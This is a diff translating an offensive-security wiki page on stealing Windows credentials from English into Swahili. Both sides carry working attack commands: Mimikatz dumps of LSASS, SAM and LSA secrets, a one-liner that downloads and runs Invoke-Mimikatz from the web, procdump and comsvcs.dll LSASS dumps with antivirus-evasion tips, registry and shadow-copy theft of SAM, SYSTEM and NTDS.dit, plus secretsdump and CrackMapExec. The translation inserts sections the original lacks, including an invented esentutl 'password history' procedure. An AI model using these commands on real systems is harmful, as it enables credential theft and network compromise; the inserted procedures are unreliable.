@@ -1,21 +1,20 @@
-# Stealing Windows Credentials
+# Kuiba Vitambulisho vya Windows
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Njia nyingine za kusaidia HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 
-## Credentials Mimikatz
-
+## Kuiga Vitambulisho vya Mimikatz
 ```bash
 #Elevate Privileges to extract the credentials
 privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
@@ -29,23 +28,19 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-
-**Find other things that Mimikatz can do in** [**this page**](credentials-mimikatz.md)**.**
+**Pata vitu vingine ambavyo Mimikatz inaweza kufanya** [**kwenye ukurasa huu**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
-
 ```bash
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
+[**Jifunze kuhusu ulinzi wa vibali kadhaa hapa.**](credentials-protections.md) **Ulinzi huu unaweza kuzuia Mimikatz kutoa baadhi ya vibali.**
 
-[**Learn about some possible credentials protections here.**](credentials-protections.md) **This protections could prevent Mimikatz from extracting some credentials.**
+## Vibali na Meterpreter
 
-## Credentials with Meterpreter
-
-Use the [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **that** I have created to **search for passwords and hashes** inside the victim.
-
+Tumia [**Programu-jalizi ya Vibali**](https://github.com/carlospolop/MSF-Credentials) **ambayo** nimeunda ili **kutafuta nywila na hashi** ndani ya mwathiriwa.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -62,13 +57,12 @@ mimikatz_command -f "sekurlsa::logonpasswords"
 mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
-
-## Bypassing AV
+## Kuvuka AV
 
 ### Procdump + Mimikatz
 
-As **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**, it's not detected by Defender.\
-You can use this tool to **dump the lsass process**, **download the dump** and **extract** the **credentials locally** from the dump.
+Kwa kuwa **Procdump kutoka** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ni chombo halali cha Microsoft**, hakigunduliwi na Defender.\
+Unaweza kutumia chombo hiki ku **dump mchakato wa lsass**, **kupakua dump** na **kuchimbua** **vitambulisho kwa kiwango cha ndani** kutoka kwenye dump.
 
 {% code title="Dump lsass" %}
 ```bash
@@ -78,9 +72,7 @@ C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
-{% endcode %}
-
-{% code title="Extract credentials from the dump" %}
+{% code title="Chukua siri za kuingia kutoka kwenye kichujio" %}
 ```c
 //Load the dump
 mimikatz # sekurlsa::minidump lsass.dmp
@@ -89,50 +81,46 @@ mimikatz # sekurlsa::logonPasswords
 ```
 {% endcode %}
 
-This process is done automatically with [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+Hii mchakato inafanywa kiotomatiki na [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Note**: Some **AV** may **detect** as **malicious** the use of **procdump.exe to dump lsass.exe**, this is because they are **detecting** the string **"procdump.exe" and "lsass.exe"**. So it is **stealthier** to **pass** as an **argument** the **PID** of lsass.exe to procdump **instead o**f the **name lsass.exe.**
+**Maelezo**: Baadhi ya **AV** inaweza **kugundua** kama **hatari** matumizi ya **procdump.exe kudump lsass.exe**, hii ni kwa sababu wanagundua neno **"procdump.exe" na "lsass.exe"**. Hivyo ni **siri zaidi** ku **pita** kama **hoja** PID ya lsass.exe kwa procdump **badala ya** jina la lsass.exe.
 
-### Dumping lsass with **comsvcs.dll**
+### Kudump lsass na **comsvcs.dll**
 
-A DLL named **comsvcs.dll** found in `C:\Windows\System32` is responsible for **dumping process memory** in the event of a crash. This DLL includes a **function** named **`MiniDumpW`**, designed to be invoked using `rundll32.exe`.\
-It is irrelevant to use the first two arguments, but the third one is divided into three components. The process ID to be dumped constitutes the first component, the dump file location represents the second, and the third component is strictly the word **full**. No alternative options exist.\
-Upon parsing these three components, the DLL is engaged in creating the dump file and transferring the specified process's memory into this file.\
-Utilization of the **comsvcs.dll** is feasible for dumping the lsass process, thereby eliminating the need to upload and execute procdump. This method is described in detail at [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+DLL iitwayo **comsvcs.dll** iliyo katika `C:\Windows\System32` inawajibika kwa **kudump kumbukumbu ya mchakato** katika tukio la ajali. DLL hii ina **kazi** iitwayo **`MiniDumpW`**, iliyoundwa kuitwa kwa kutumia `rundll32.exe`.\
+Ni haifai kutumia hoja mbili za kwanza, lakini ya tatu imegawanywa katika sehemu tatu. Kitambulisho cha mchakato kinachotakiwa kudump kinawakilisha sehemu ya kwanza, mahali pa faili ya dump inawakilisha ya pili, na sehemu ya tatu ni neno **full**. Hakuna chaguo mbadala zilizopo.\
+Baada ya kuchambua sehemu hizi tatu, DLL inahusika katika kuunda faili ya dump na kuhamisha kumbukumbu ya mchakato uliopewa katika faili hii.\
+Matumizi ya **comsvcs.dll** yanawezekana kwa kudump mchakato wa lsass, hivyo kuondoa haja ya kupakia na kutekeleza procdump. Njia hii imeelezewa kwa undani katika [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
-The following command is employed for execution:
-
+Amri ifuatayo inatumika kwa utekelezaji:
 ```bash
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
+**Unaweza kusindika hii taratibu kiotomatiki kwa kutumia** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
 
-**You can automate this process with** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
+### **Kuchota lsass kwa kutumia Task Manager**
 
-### **Dumping lsass with Task Manager**
+1. Bonyeza kulia kwenye Task Bar na bonyeza kwenye Task Manager
+2. Bonyeza kwenye More details
+3. Tafuta mchakato wa "Local Security Authority Process" kwenye kichupo cha Processes
+4. Bonyeza kulia kwenye mchakato wa "Local Security Authority Process" na bonyeza "Create dump file".
 
-1. Right click on the Task Bar and click on Task Manager
-2. Click on More details
-3. Search for "Local Security Authority Process" process in the Processes tab
-4. Right click on "Local Security Authority Process" process and click on "Create dump file".
+### Kuchota lsass kwa kutumia procdump
 
-### Dumping lsass with procdump
-
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is a Microsoft signed binary which is a part of [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
-
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ni faili iliyosainiwa na Microsoft ambayo ni sehemu ya [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
+## Kudondosha lsass na PPLBlade
 
-## Dumpin lsass with PPLBlade
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni chombo cha Kudondosha Mchakato Uliolindwa kinachosaidia kuficha kumbukumbu ya kudondosha na kuhamisha kwenye vituo vya kazi vya mbali bila kuacha kwenye diski.
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is a Protected Process Dumper Tool that support obfuscating memory dump and transferring it on remote workstations without dropping it onto the disk.
+**Vipengele muhimu**:
 
-**Key functionalities**:
-
-1. Bypassing PPL protection
-2. Obfuscating memory dump files to evade Defender signature-based detection mechanisms
-3. Uploading memory dump with RAW and SMB upload methods without dropping it onto the disk (fileless dump)
+1. Kupita kinga ya PPL
+2. Kuficha faili za kumbukumbu ya kudondosha ili kuepuka mbinu za kugundua saini za Defender
+3. Kupakia kumbukumbu ya kudondosha kwa njia za RAW na SMB bila kuacha kwenye diski (kudondosha bila faili)
 
 {% code overflow="wrap" %}
 ```bash
@@ -142,66 +130,111 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 
 ## CrackMapExec
 
-### Dump SAM hashes
-
+### Dumpisha hashi za SAM
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
+### Pata Siri za LSA
 
-### Dump LSA secrets
+**Description**: Siri za LSA ni habari muhimu za uwakilishi wa usalama katika mfumo wa Windows. Kwa kudump siri hizi, unaweza kupata nywila na habari nyingine muhimu za uwakilishi wa usalama.
 
+**Technique**: Kuna njia kadhaa za kudump siri za LSA:
+
+1. **LSA Secrets Dump**: Unaweza kutumia zana kama `lsadump` au `mimikatz` kudump siri za LSA kutoka kwa mfumo uliopo. Zana hizi zinaweza kuchambua na kutoa habari muhimu kama vile nywila za akaunti za mtumiaji na nywila za kuhifadhiwa kwa programu.
+
+2. **Registry**: Siri za LSA zinahifadhiwa katika rejista ya Windows. Unaweza kuchunguza na kudump siri hizi kwa kuchambua sehemu maalum za rejista kama vile `HKEY_LOCAL_MACHINE\Security\Policy\Secrets`.
+
+**Impact**: Kwa kudump siri za LSA, unaweza kupata ufikiaji usio halali kwa akaunti za mtumiaji na habari nyingine muhimu za uwakilishi wa usalama. Hii inaweza kusababisha uvunjaji wa usalama, upotezaji wa data, na uharibifu mwingine wa mfumo.
+
+**Countermeasures**: Kuna hatua kadhaa za kuchukua ili kuzuia kudump siri za LSA:
+
+- Tumia sera kali za usalama kwenye mfumo wako ili kuzuia ufikiaji usio halali kwa siri za LSA.
+- Funga na sasisha programu zote zinazojulikana kama `lsadump` au `mimikatz` ili kuzuia matumizi yao mabaya.
+- Fanya ukaguzi wa mara kwa mara wa mfumo wako ili kugundua na kurekebisha mapungufu yoyote ya usalama yanayoweza kusababisha kudump siri za LSA.
+
+**References**:
+- [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dumping-lsass-credentials](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dumping-lsass-credentials)
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
+### Pata NTDS.dit kutoka kwa DC ya lengo
 
-### Dump the NTDS.dit from target DC
+```bash
+# On the attacker machine
+impacket-secretsdump -just-dc-ntlm <target_DC_IP>
+```
 
+Hii itakusaidia kupata faili ya NTDS.dit kutoka kwa DC ya lengo.
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
+### Pata historia ya nywila ya NTDS.dit kutoka kwa DC ya lengo
 
-### Dump the NTDS.dit password history from target DC
+```plaintext
+To dump the NTDS.dit password history from a target Domain Controller (DC), you can use the following steps:
 
+1. Gain administrative access to the target DC.
+2. Open a command prompt with administrative privileges.
+3. Navigate to the directory where the NTDS.dit file is located. The default path is `C:\Windows\NTDS`.
+4. Use the `ntdsutil` command to enter the NTDS utility.
+5. Within the NTDS utility, use the `activate instance ntds` command to activate the NTDS instance.
+6. Use the `ifm` command to create an Install From Media (IFM) snapshot of the NTDS database.
+7. Specify a directory where the IFM snapshot will be stored.
+8. Exit the NTDS utility by using the `quit` command.
+9. Navigate to the directory where the IFM snapshot is stored.
+10. Use the `esentutl` command to dump the password history from the NTDS.dit file. The command syntax is as follows:
+    ```
+    esentutl /r <NTDS.dit> /l <log files path> /s <system files path> /d <destination path> /p "<password>"
+    ```
+    - `<NTDS.dit>`: Path to the NTDS.dit file.
+    - `<log files path>`: Path to the log files directory.
+    - `<system files path>`: Path to the system files directory.
+    - `<destination path>`: Path where the dumped password history will be saved.
+    - `<password>`: Password for the NTDS database.
+11. Once the password history is dumped, you can analyze it to extract the desired credentials.
+
+Note: Dumping the NTDS.dit file and accessing password history may be subject to legal restrictions and should only be performed with proper authorization and for legitimate purposes.
+```
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
+### Onyesha sifa ya pwdLastSet kwa kila akaunti ya NTDS.dit
 
-### Show the pwdLastSet attribute for each NTDS.dit account
+Ili kuonyesha sifa ya pwdLastSet kwa kila akaunti ya NTDS.dit, unaweza kutumia zana ya PowerShell ifuatayo:
 
+```powershell
+Get-ADUser -Filter * -Properties pwdLastSet | Select-Object Name, pwdLastSet
+```
+
+Zana hii itakupa orodha ya akaunti zote za NTDS.dit pamoja na sifa ya pwdLastSet kwa kila akaunti.
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
+## Kuiba SAM & SYSTEM
 
-## Stealing SAM & SYSTEM
+Faili hizi zinapaswa kuwa **zimehifadhiwa** katika _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM._ Lakini **hauwezi tu kuzikopi kwa njia ya kawaida** kwa sababu zimekingwa.
 
-This files should be **located** in _C:\windows\system32\config\SAM_ and _C:\windows\system32\config\SYSTEM._ But **you cannot just copy them in a regular way** because they protected.
+### Kutoka kwenye Usajili (Registry)
 
-### From Registry
-
-The easiest way to steal those files is to get a copy from the registry:
-
+Njia rahisi ya kuiba faili hizo ni kupata nakala kutoka kwenye usajili (registry):
 ```
 reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-
-**Download** those files to your Kali machine and **extract the hashes** using:
-
+**Pakua** faili hizo kwenye kifaa chako cha Kali na **toanishe alama** kwa kutumia:
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
+### Kivuli ya Nakala
 
-### Volume Shadow Copy
+Unaweza kufanya nakala ya faili zilizolindwa kwa kutumia huduma hii. Unahitaji kuwa Msimamizi.
 
-You can perform copy of protected files using this service. You need to be Administrator.
+#### Kutumia vssadmin
 
-#### Using vssadmin
-
-vssadmin binary is only available in Windows Server versions
-
+Faili ya vssadmin inapatikana tu kwenye toleo la Windows Server.
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
@@ -214,9 +247,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-
-But you can do the same from **Powershell**. This is an example of **how to copy the SAM file** (the hard drive used is "C:" and its saved to C:\users\Public) but you can use this for copying any protected file:
-
+Lakini unaweza kufanya hivyo kutoka **Powershell**. Hii ni mfano wa **jinsi ya kunakili faili ya SAM** (diski ngumu inayotumiwa ni "C:" na imehifadhiwa kwenye C:\users\Public) lakini unaweza kutumia hii kunakili faili yoyote iliyolindwa:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -225,130 +256,113 @@ $volume=(gwmi win32_shadowcopy -filter "ID='$id'")
 cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
 $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
-
-Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
+Code kutoka kwenye kitabu: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
 
 ### Invoke-NinjaCopy
 
-Finally, you could also use the [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) to make a copy of SAM, SYSTEM and ntds.dit.
-
+Mwishowe, unaweza pia kutumia [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kuunda nakala ya SAM, SYSTEM na ntds.dit.
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
-
 ## **Active Directory Credentials - NTDS.dit**
 
-The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.
+Faili la **NTDS.dit** linajulikana kama moyo wa **Active Directory**, likiwa na data muhimu kuhusu vitu vya mtumiaji, vikundi, na uanachama wao. Hapo ndipo **hashi za nywila** za watumiaji wa kikoa zinahifadhiwa. Faili hili ni **database ya Extensible Storage Engine (ESE)** na lipo katika **_%SystemRoom%/NTDS/ntds.dit_**.
 
-Within this database, three primary tables are maintained:
+Ndani ya database hii, kuna meza tatu kuu zinazosimamiwa:
 
-- **Data Table**: This table is tasked with storing details about objects like users and groups.
-- **Link Table**: It keeps track of relationships, such as group memberships.
-- **SD Table**: **Security descriptors** for each object are held here, ensuring the security and access control for the stored objects.
+- **Meza ya Data**: Meza hii inahusika na kuhifadhi maelezo kuhusu vitu kama watumiaji na vikundi.
+- **Meza ya Link**: Inasimamia uhusiano, kama vile uanachama wa vikundi.
+- **Meza ya SD**: **Maelezo ya usalama** kwa kila kipengee yanahifadhiwa hapa, ikidhibiti usalama na udhibiti wa ufikiaji kwa vitu vilivyohifadhiwa.
 
-More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
+Maelezo zaidi kuhusu hili: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).
+Windows hutumia _Ntdsa.dll_ kuwasiliana na faili hiyo na hutumiwa na _lsass.exe_. Kwa hivyo, **sehemu** ya faili ya **NTDS.dit** inaweza kupatikana **ndani ya kumbukumbu ya `lsass`** (unaweza kupata data iliyotembelewa hivi karibuni labda kwa sababu ya kuboresha utendaji kwa kutumia **cache**).
 
-#### Decrypting the hashes inside NTDS.dit
+#### Kufichua hashi ndani ya NTDS.dit
 
-The hash is cyphered 3 times:
+Hashi imefichwa mara 3:
 
-1. Decrypt Password Encryption Key (**PEK**) using the **BOOTKEY** and **RC4**.
-2. Decrypt tha **hash** using **PEK** and **RC4**.
-3. Decrypt the **hash** using **DES**.
+1. Fichua Funguo wa Kufichua Nywila (**PEK**) kwa kutumia **BOOTKEY** na **RC4**.
+2. Fichua **hashi** kwa kutumia **PEK** na **RC4**.
+3. Fichua **hashi** kwa kutumia **DES**.
 
-**PEK** have the **same value** in **every domain controller**, but it is **cyphered** inside the **NTDS.dit** file using the **BOOTKEY** of the **SYSTEM file of the domain controller (is different between domain controllers)**. This is why to get the credentials from the NTDS.dit file **you need the files NTDS.dit and SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
+**PEK** ina **thamani ile ile** katika **kila kudhibiti kikoa**, lakini imefichwa ndani ya faili ya **NTDS.dit** kwa kutumia **BOOTKEY** ya **faili ya SYSTEM ya kudhibiti kikoa (inatofautiana kati ya kudhibiti kikoa)**. Ndio maana ili kupata vibali kutoka kwenye faili ya NTDS.dit **unahitaji faili za NTDS.dit na SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
 
-### Copying NTDS.dit using Ntdsutil
+### Kunakili NTDS.dit kwa kutumia Ntdsutil
 
-Available since Windows Server 2008.
-
+Inapatikana tangu Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
+Unaweza pia kutumia mbinu ya [**kivuli cha nakala ya diski**](./#stealing-sam-and-system) kuiga faili ya **ntds.dit**. Kumbuka kuwa pia utahitaji nakala ya faili ya **SYSTEM** (tena, [**ichote kutoka kwenye usajili au tumia mbinu ya kivuli cha nakala ya diski**](./#stealing-sam-and-system)).
 
-You could also use the [**volume shadow copy**](./#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) trick).
+### **Kuchambua hash kutoka NTDS.dit**
 
-### **Extracting hashes from NTDS.dit**
-
-Once you have **obtained** the files **NTDS.dit** and **SYSTEM** you can use tools like _secretsdump.py_ to **extract the hashes**:
-
+Baada ya kupata faili za **NTDS.dit** na **SYSTEM** unaweza kutumia zana kama _secretsdump.py_ ku **chambua hash**:
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-
-You can also **extract them automatically** using a valid domain admin user:
-
+Unaweza pia **kuzitoa kiotomatiki** kwa kutumia mtumiaji halali wa admin wa kikoa:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
+Kwa **faili kubwa za NTDS.dit**, inapendekezwa kuzitoa kwa kutumia [gosecretsdump](https://github.com/c-sto/gosecretsdump).
 
-For **big NTDS.dit files** it's recommend to extract it using [gosecretsdump](https://github.com/c-sto/gosecretsdump).
+Mwishowe, unaweza pia kutumia moduli ya **metasploit**: _post/windows/gather/credentials/domain\_hashdump_ au **mimikatz** `lsadump::lsa /inject`
 
-Finally, you can also use the **metasploit module**: _post/windows/gather/credentials/domain\_hashdump_ or **mimikatz** `lsadump::lsa /inject`
+### **Kuchimbua vitu vya kikoa kutoka NTDS.dit hadi kwenye database ya SQLite**
 
-### **Extracting domain objects from NTDS.dit to an SQLite database**
-
-NTDS objects can be extracted to an SQLite database with [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Not only secrets are extracted but also the entire objects and their attributes for further information extraction when the raw NTDS.dit file is already retrieved.
-
+Vitu vya NTDS vinaweza kuchimbwa kwenye database ya SQLite na [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Sio tu siri zinazochimbwa lakini pia vitu vyote na sifa zao kwa ajili ya uchimbaji wa habari zaidi wakati faili ya NTDS.dit ya awali imepatikana.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-
-The `SYSTEM` hive is optional but allow for secrets decryption (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Along with other information, the following data is extracted : user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...
+`SYSTEM` hive ni hiari lakini inaruhusu kufichua siri (NT & LM hashes, nywila za wazi, kerberos au trust keys, NT & LM password histories). Pamoja na habari nyingine, data ifuatayo inachimbwa: akaunti za mtumiaji na mashine pamoja na hashes zao, alama za UAC, muda wa kuingia mwisho na mabadiliko ya nywila, maelezo ya akaunti, majina, UPN, SPN, vikundi na uanachama wa kurekursi, muundo wa vitengo vya shirika na uanachama, domain za kuaminika na aina za uaminifu, mwelekeo na sifa...
 
 ## Lazagne
 
-Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). you can use this binary to extract credentials from several software.
-
+Pakua faili ya binary kutoka [hapa](https://github.com/AlessandroZ/LaZagne/releases). Unaweza kutumia faili hii ya binary kuchimbua siri kutoka programu mbalimbali.
 ```
 lazagne.exe all
 ```
-
-## Other tools for extracting credentials from SAM and LSASS
+## Zana nyingine za kuchukua siri kutoka kwa SAM na LSASS
 
 ### Windows credentials Editor (WCE)
 
-This tool can be used to extract credentials from the memory. Download it from: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+Zana hii inaweza kutumika kuchukua siri kutoka kwa kumbukumbu. Pakua kutoka: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
-Extract credentials from the SAM file
-
+Chukua siri kutoka kwa faili ya SAM
 ```
 You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
 ```
-
 ### PwDump
 
-Extract credentials from the SAM file
-
+Chukua siri za kuingia kutoka kwenye faili ya SAM
 ```
 You can find this binary inside Kali, just do: locate pwdump.exe
 PwDump.exe -o outpwdump -x 127.0.0.1
 type outpwdump
 ```
-
 ### PwDump7
 
-Download it from:[ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) and just **execute it** and the passwords will be extracted.
+Pakua kutoka: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) na tu **itekeleze** na nywila zitachimbuliwa.
 
-## Defenses
+## Ulinzi
 
-[**Learn about some credentials protections here.**](credentials-protections.md)
+[Jifunze kuhusu baadhi ya ulinzi wa vitambulisho hapa.](credentials-protections.md)
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kuhack AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Njia nyingine za kusaidia HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
